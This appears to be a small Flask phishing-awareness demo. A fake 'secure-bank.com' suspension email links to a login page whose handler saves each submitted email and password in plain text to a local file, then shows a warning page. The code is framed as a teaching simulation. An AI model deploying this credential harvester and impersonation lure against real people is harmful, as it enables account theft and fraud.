from flask import Flask, render_template, request
import datetime

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email")
    password = request.form.get("password")

    # Enregistrer dans un fichier local (simulation pédagogique)
    with open("captured_data.txt", "a") as f:
        f.write(f"Date: {datetime.datetime.now()}\n")
        f.write(f"Email: {email}\n")
        f.write(f"Password: {password}\n")
        f.write("-" * 30 + "\n")

    return render_template("warning.html", email=email, request=request)

@app.route("/fake-email")
def fake_email():
    return """
    <h2>From: support@secure-bank.com</h2>
    <h3>Subject: Urgent - Account Suspension</h3>
    <p>Dear customer,</p>
    <p>
    We detected unusual activity on your account.
    Please verify your account immediately to avoid suspension.
    </p>
    <a href="http://127.0.0.1:5000">
    Click here to verify your account
    </a>
    """
if __name__ == "__main__":
    app.run(debug=True)